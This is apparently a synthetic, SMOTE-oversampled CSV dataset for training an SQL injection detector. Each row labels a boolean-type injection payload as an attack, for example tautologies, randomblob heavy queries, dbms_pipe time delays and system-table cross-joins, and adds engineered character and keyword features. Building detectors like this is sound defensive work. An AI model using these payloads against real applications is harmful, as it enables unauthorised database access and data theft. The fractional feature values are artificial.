id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000179,attack,boolean,"1""  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""hsaw""  =  ""hsaw",nearest_attack_euclidean,R000120,0.9738686888973374,137.21927814457777,32.77005156110159,3.6435521175689134,43.0,15.0,58.75938126678094,20.459896877796822,0.31391544169943303,0.10950538663933711,0.427464578138982,0.14911459352224782,2.9197937555936475,3.0802062444063525,0.0,1.0,0.0,2.0,0.0,10.459896877796824,0.0,0.0,1.0,3.0,1.0,0.7700515611015881,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000180,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.08196134323264403,135.81520812238233,29.0,3.9914114122373316,83.82942288219905,3.0710737990837256,34.94314096073302,13.97157048036651,0.617188189245514,0.022669799874954558,0.25727731267194576,0.10286469820758565,2.97157048036651,0.0,0.0,-1.3877787807814457e-17,1.0,0.014214759816745248,0.0,4.9857852401832545,0.0,0.0,2.0,1.014214759816745,1.0,0.0,0.0,0.0,0.0,0.014214759816744915,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000181,attack,boolean,"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'novq'  =  'novq",nearest_attack_euclidean,R000063,0.10884778020974546,147.3516934668649,31.967584673343246,3.4678180476191565,42.74067738674596,15.0,67.61101608011894,22.0,0.28998613989459515,0.10186468528278222,0.4587476364078753,0.14940153841474726,6.0,0.0,0.0,1.0,0.0,2.0,0.0,11.93516934668649,0.0648306533135099,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000182,attack,boolean,"1""  )   as klur where 7046  =  7046 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000046,1.5280891019241691,128.65700240615317,37.131400481230635,3.879122876794838,39.26280096246127,20.508533974974178,51.50853397497418,17.377133493743546,0.30394628484669006,0.15801574296866033,0.4020866585221528,0.13595131366249677,2.0,0.6885667468717722,2.0,1.0,0.0,1.6885667468717722,0.0,9.0,0.0,0.0,1.0,4.688566746871772,1.0,0.6885667468717722,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6885667468717722,0.0,0.6885667468717722,0.3114332531282278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6885667468717722
SMOTE_000183,attack,boolean,"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000032,0.26389662308378115,160.89624316095325,32.0,4.047706985955874,73.89624316095326,18.0,48.0,21.0,0.45927690819110767,0.11187374313287428,0.2983299816876647,0.1305193669883533,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.896243160953262,0.1037568390467381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000184,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R000060,0.9431285665050062,111.26139151369972,27.50134017808232,3.536091065804524,37.008041068493924,13.0,47.50402053424696,13.74932991095884,0.3310953484219972,0.1173200113296581,0.42726154563869745,0.12432309460964724,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.7493299109588398,0.0,6.50134017808232,1.4986598219176794,0.0,0.0,1.7493299109588394,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000185,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000068,4.130038700424304,129.76462249971027,34.15292449994205,3.8007352458733656,45.15292449994205,15.0,51.882311249855135,17.729386749913083,0.34817761482941517,0.11576376158548062,0.39967140662591677,0.1363872169591874,2.4235377500289728,2.305848999884108,0.0,1.0,0.0,1.0,0.0,9.576462249971026,0.0,0.0,1.0,2.0,1.0,0.576462249971027,0.0,0.423537750028973,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5764622499710271,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.576462249971027
SMOTE_000186,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,1.009019302937327,148.35944630693635,33.64746539418352,3.850249758740638,56.70852506219289,10.528801908724718,56.88479236510113,24.237326970917607,0.3820473455114148,0.07227171763222498,0.383492159469679,0.16218877738668122,0.0,3.176267302908239,0.0,-1.3877787807814457e-17,0.17626730290823933,1.0,0.0,11.294930788367044,0.0,1.8237326970917607,1.0,6.118663485458804,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8237326970917607,1.0,0.0,0.0,1.0,1.0,0.17626730290823933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.176267302908239
SMOTE_000187,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000023,0.903693671077947,72.5937013541364,26.821044839028907,3.697716720758652,17.235791032194218,15.292626903417345,28.82949238633062,11.235791032194218,0.23799161362138915,0.2125193406654377,0.39446706028846507,0.15502198542470808,0.0,4.0,0.7642089678057816,-1.3877787807814457e-17,1.0,1.0,0.0,4.4715820643884365,0.0,0.0,0.0,2.7642089678057813,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2357910321942183,0.7642089678057815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000188,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000029,0.21183213898586953,149.21067862204325,30.953569330708426,4.179514142307219,84.53569330708426,8.976784665354213,39.79106198818791,15.907138661416852,0.566519903056837,0.06020813748303119,0.2666800088130148,0.10659195064711702,1.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.976784665354213,0.0,0.0,2.976784665354213,2.0,1.0,0.0,0.0,0.9767846653542128,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000189,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000111,0.9695844399004604,148.57989249829316,33.66124328114332,3.850663812078472,56.7980813274316,10.508135078285015,56.96745968685994,24.306216405716615,0.3820891455729811,0.07198498387656804,0.38347749278141013,0.1624483777690407,0.0,3.1693783594283387,0.0,-1.3877787807814457e-17,0.16937835942833834,1.0,0.0,11.322486562286645,0.0,1.8306216405716618,1.0,6.153108202858308,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8306216405716617,1.0,0.0,0.0,1.0,1.0,0.16937835942833834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1693783594283382
SMOTE_000190,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000031,0.2535483575692728,161.53304239747922,33.82378874267709,4.083118238147863,80.85462682740106,16.0,47.942732456062515,16.73568311401563,0.5006478355048636,0.09933067259865194,0.29642615877500766,0.1035953331214767,0.0,0.9118943713385432,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.8237887426770865,0.0,0.0,2.0,5.0,0.0,0.911894371338543,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000191,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000050,0.9257248356132537,126.9024188040115,28.53095529261627,4.028220189987527,64.53095529261627,8.827388231540674,32.71668704831389,20.827388231540674,0.5121888715942109,0.06851369873900601,0.2554165062526409,0.16388092341414212,3.7654776463081348,0.0,0.0,-1.3877787807814457e-17,1.0,1.7654776463081345,0.0,3.530955292616269,1.7654776463081343,5.0,4.0,2.7654776463081348,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.7654776463081345,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7654776463081343
SMOTE_000192,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'ltki'  =  'ltki,nearest_attack_euclidean,R000139,0.08341262803643426,136.75104103175818,26.017782783445845,3.2821387892567726,42.0,13.0,65.78660659864985,15.964434433108309,0.30718985678393906,0.09508257471883827,0.48099201210129916,0.11673555639592355,3.928868866216619,0.0711311337833811,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,9.964434433108309,0.0,0.0,0.0,2.0,0.9822172165541547,0.017782783445845274,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000193,attack,boolean,-6540'  )   where 5019  =  5019 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000140,1.7906460675097196,65.0,20.720931268269396,3.5226334763457037,9.581396902404101,22.279068731730604,24.0,9.139534365865302,0.14740610619083225,0.3427549035650862,0.36923076923076925,0.14060822101331233,0.5697671829326507,0.4302328170673493,3.0,-1.3877787807814457e-17,0.5697671829326507,2.0,0.0,2.569767182932651,0.0,0.0,0.0,5.569767182932651,0.5697671829326507,0.4302328170673493,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000194,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.2891447951131485,133.81808112919015,28.563616225838032,3.9895805009119947,84.0,3.0,33.25446490335212,13.563616225838032,0.6279345074735085,0.02242623240976814,0.24831468271970325,0.1013245773970201,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.5636162258380315,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000195,attack,boolean,"1""   )    )     )   and make_set  (  6751  =  8128,8128  )   and    (    (     (  ""uhiy""  =  ""uhiy",nearest_attack_euclidean,R000122,1.8603395779723195,91.09397036847861,23.618794073695724,3.21892634027412,17.316784196521933,14.381205926304277,44.31678419652193,15.079196049130482,0.18773930090006125,0.16033151782488286,0.4861733800801789,0.16575580119487698,0.0,4.0,0.460401975434759,-1.3877787807814457e-17,0.46040197543475897,2.0,0.0,7.079196049130482,0.0,0.539598024565241,0.539598024565241,2.920803950869518,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.539598024565241,0.460401975434759,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000196,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,0.7932963188621206,143.5461958635881,33.671066272722676,3.8125754033654577,40.34213254544535,22.519798227252046,55.013198818168036,25.671066272722676,0.28133567939603465,0.15599296181189592,0.3835629660895025,0.17910839270256682,0.8355331363613387,0.0,2.0,-1.3877787807814457e-17,0.0,1.8355331363613387,0.0,11.0,0.0,2.0,1.0,9.835533136361338,0.8355331363613387,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.8355331363613387,0.0,0.16446686363866125,0.8355331363613387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8355331363613387
SMOTE_000197,attack,boolean,"-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000107,0.13509267059038105,71.19396462765316,24.806035372346848,3.5698057813627027,11.90301768617342,15.903017686173424,28.387929255306304,15.0,0.16732882388631334,0.2235249353714766,0.3984108226728479,0.21073541806936213,0.0,4.0,0.9676725620578078,-1.3877787807814457e-17,0.0,2.0,0.0,4.064654875884385,2.0,0.9676725620578078,1.0,2.9676725620578077,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0323274379421923,0.9676725620578077,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000198,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000027,1.0959009668557598,129.88786619038245,31.221966547595617,4.187128249715198,73.44393309519123,8.610983273797808,32.83294982139342,15.0,0.5655009405943909,0.0662418032903258,0.25266736094871106,0.1155898951665722,0.3890167262021922,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.0,0.3890167262021922,0.0,2.6109832737978076,4.0,0.38901672620219224,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000199,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000125,0.31325088211211694,76.68331270683655,19.64742796416791,2.9549516356489276,14.906399149835071,9.517942371334325,40.0,12.258971185667162,0.19339599368816945,0.1235902823467493,0.5231314381403844,0.15988228582469674,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.1294855928335814,0.1294855928335814,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000200,attack,boolean,"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",nearest_attack_euclidean,R000113,0.9498141140109733,125.09807416283073,31.0,3.707720982737938,40.80385167433856,15.0,50.19614832566144,19.09807416283072,0.32664191145515753,0.11992999543583287,0.4009333941888952,0.15249469892011444,6.0,0.0,0.0,1.0,0.0,2.0,0.0,8.54903708141536,0.5490370814153607,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000201,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R000121,0.11682412651328998,118.5135411278727,27.94864588721273,4.048460889421796,79.64052121048911,3.0,23.71895757902178,12.15406233836181,0.6724376464915187,0.025321727795046475,0.19975010251479725,0.10249052319863752,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,2.1540623383618094,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000202,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000056,1.4494694011441367,73.69080265579643,20.738160531159288,3.447443542869599,10.476321062318576,24.0,28.6350947497581,10.579386843719764,0.13944716355002543,0.3291193723578626,0.38705805672983884,0.14437540736227314,0.42061315628023777,0.5793868437197623,3.0,-1.3877787807814457e-17,1.0,2.0,0.0,3.5793868437197625,0.0,0.0,0.0,6.0,0.42061315628023765,0.5793868437197623,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000203,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.08092863929477505,91.04023149004698,30.879305529859064,3.6435622322929793,20.160925960187914,16.0,39.919537019906045,14.95976850995302,0.2214333053722122,0.1757472881222227,0.4384936226958398,0.1643257838097253,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.9597685099530213,0.0,6.0,0.0,1.0,1.0,2.9597685099530215,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000204,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.48830567107737227,146.78949981519685,30.878949981519686,4.216989035731734,81.1526498706378,8.878949981519686,38.75789996303937,18.0,0.5527738540936277,0.060467053414029664,0.2640706375703657,0.12268845492197691,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.24210003696062843,0.0,2.878949981519686,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.121050018480314,0.8789499815196858,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000205,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000003,0.4089572190651538,67.47558692661401,24.28564464537854,3.476293026441776,24.666504172549924,4.8569339361356185,27.761719054342773,10.190429763585694,0.3665103440366879,0.06928121016776993,0.41245492671406625,0.1517535190814759,0.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.9047851182071533,0.0,2.3808595271713857,0.0,0.09521488179284654,0.09521488179284665,5.809570236414307,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9047851182071536,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9047851182071533
SMOTE_000206,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,0.8006006469259713,156.72656891806434,34.69062756722574,3.967129895280825,57.89922580987079,15.517970675419306,58.654686216387134,24.654686216387127,0.3690202205715882,0.09890075937122295,0.37456925893936294,0.15750976111782586,4.0,4.0,0.1726568918064354,-1.3877787807814457e-17,0.0,1.8273431081935647,0.0,8.0,1.654686216387129,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.8273431081935647,0.1726568918064354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000207,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000146,1.631077842257488,143.9280537699044,36.711331092920645,3.988659432682157,49.309351256634805,21.577337814158703,52.59802016371415,20.443344535396754,0.34264689644890334,0.15027456822649268,0.36539538803706845,0.14168314728753553,4.577337814158702,0.0,0.0,0.2886689070793509,0.711331092920649,2.0,0.0,8.577337814158701,0.0,0.7113310929206491,1.0,5.577337814158701,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2886689070793509,1.7113310929206489,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.711331092920649
